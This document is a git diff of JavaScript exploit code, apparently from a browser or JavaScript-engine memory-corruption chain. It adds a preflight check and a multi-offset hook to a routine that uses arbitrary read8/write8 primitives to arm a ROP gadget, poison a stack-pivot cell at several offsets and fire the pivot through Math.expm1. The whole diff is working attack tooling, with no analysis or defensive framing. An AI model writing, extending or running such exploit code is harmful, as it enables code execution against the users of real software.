@@ -483,20 +483,44 @@ export function bisectHookPivotPoops(p, prep) {
     p.write8(prep.pivotCell, prep.M.S);
 }
 
-/** chain_poops callAddr — layout + arm G0 + hook pivotCell+0 + expm1. */
-export function bisectFirePoopsStyle(p, prep) {
+/** Offsets poisoned for G0 `mov rdi,[rsi+0x30]` — cover rsi=pivotCell and rsi=pivotCell-0x30. */
+export const G0_HOOK_OFFS = [0x0, 0x20, 0x28, 0x30, 0x38];
+
+/** Slab + arm checks before fire — throws instead of OOM when bufAddr is wrong. */
+export function bisectPreflight(p, prep) {
+    const out = { ok: true, reasons: [], slab: null, armed: null, g0: null };
+    if (!prep || !prep.M || !prep.G)
+        return Object.assign(out, { ok: false, reasons: ["no prep"] });
+    out.g0 = prep.G.G0;
+    try {
+        out.slab = verifySlabAddrs(p, prep);
+        if (!out.slab.S.ok) { out.ok = false; out.reasons.push("S unreadable (bufAddr?)"); }
+        if (!out.slab.K.ok) { out.ok = false; out.reasons.push("K unreadable (bufAddr?)"); }
+        if (out.slab.rsp && !out.slab.rsp.ok)
+            out.reasons.push("rsp unreadable (layout?)");
+    } catch (e) {
+        out.ok = false;
+        out.reasons.push("slab check: " + (e.message || e));
+    }
+    if (prep.mainMf) {
+        try { out.armed = p.read8(prep.mainMf); } catch (_) { out.armed = null; }
+        if (out.armed == null)
+            out.reasons.push("mainMf unreadable");
+        else if (String(out.armed) !== String(prep.G.G0))
+            out.reasons.push("mainMf not G0 yet");
+    }
+    return out;
+}
+
+/** chain_poops callAddr — layout + arm G0 + multi-hook + expm1. */
+export function bisectFirePoopsStyle(p, prep, hookOffs) {
     if (!prep || !prep.M || !prep.G || !prep.pivotObj || !prep.mainMf)
         throw new Error("bisectFirePoopsStyle: no prep");
+    hookOffs = hookOffs || G0_HOOK_OFFS;
     layoutSmokeStack(prep);
     p.write8(prep.mainMf, prep.G.G0);
     prep.mainArmed = true;
-    const site = prep.pivotCell;
-    if (!prep._bisect) prep._bisect = {};
-    prep._bisect.pivotSite = site;
-    prep._bisect.pivotHookOff = 0;
-    prep._bisect.pivotSaved = p.read8(site);
-    prep._bisect.multiSaved = null;
-    p.write8(site, prep.M.S);
+    bisectHookPivotMulti(p, prep, hookOffs);
     Math.expm1(prep.pivotObj);
     return prep.M.frameDv.getUint32(0, true) | 0;
 }
